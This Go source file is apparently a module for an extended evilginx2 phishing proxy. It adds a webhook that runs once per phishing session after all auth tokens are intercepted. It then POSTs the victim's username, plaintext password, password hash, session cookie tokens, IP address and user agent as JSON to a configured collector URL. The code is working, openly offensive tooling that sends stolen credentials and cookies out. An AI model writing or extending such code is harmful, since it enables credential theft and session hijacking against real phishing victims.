package core

// webhook.go — evilginx2-extended: push captured credentials to an internal
// collector (Gophish-style webhook, Pro-feature #12). Fired once per session
// when all auth tokens are intercepted. Point -webhook at an internal URL
// only; the push happens from the phishing server (never from the victim).

import (
	"bytes"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"net/http"
	"strings"
	"time"

	"github.com/kgretzky/evilginx2/database"
	"github.com/kgretzky/evilginx2/log"
)

type WebhookPayload struct {
	Event          string                                      `json:"event"`
	Phishlet       string                                      `json:"phishlet"`
	SessionToken   string                                      `json:"session_token"`
	Username       string                                      `json:"username"`
	Password       string                                      `json:"password"`
	PasswordSha256 string                                      `json:"password_sha256"`
	Rid            string                                      `json:"rid,omitempty"`
	Custom         map[string]string                           `json:"custom"`
	Params         map[string]string                           `json:"params"`
	CookieTokens   map[string]map[string]*database.CookieToken `json:"cookie_tokens"`
	RemoteAddr     string                                      `json:"remote_addr"`
	UserAgent      string                                      `json:"useragent"`
	Time           int64                                       `json:"time"`
}

func (p *HttpProxy) SetWebhookUrl(url string) {
	p.webhook_url = strings.TrimSpace(url)
	if p.webhook_url != "" {
		log.Info("webhook: pushing captured credentials to %s", p.webhook_url)
	}
}

func (p *HttpProxy) SendCredWebhook(pl *Phishlet, s *Session) {
	if p.webhook_url == "" || pl == nil || s == nil {
		return
	}
	p.wh_mtx.Lock()
	if p.wh_sent[s.Id] {
		p.wh_mtx.Unlock()
		return
	}
	p.wh_sent[s.Id] = true
	p.wh_mtx.Unlock()

	sha := sha256.Sum256([]byte(s.Password))
	payload := WebhookPayload{
		Event:          "credentials_captured",
		Phishlet:       pl.Name,
		SessionToken:   s.Id,
		Username:       s.Username,
		Password:       s.Password,
		PasswordSha256: hex.EncodeToString(sha[:]),
		Rid:            s.Params["rid"],
		Custom:         s.Custom,
		Params:         s.Params,
		CookieTokens:   s.CookieTokens,
		RemoteAddr:     s.RemoteAddr,
		UserAgent:      s.UserAgent,
		Time:           time.Now().Unix(),
	}
	body, err := json.Marshal(payload)
	if err != nil {
		return
	}
	client := &http.Client{Timeout: 5 * time.Second}
	resp, err := client.Post(p.webhook_url, "application/json", bytes.NewReader(body))
	if err != nil {
		log.Warning("webhook: push failed: %v", err)
		return
	}
	resp.Body.Close()
	log.Info("webhook: credentials pushed to %s", p.webhook_url)
}
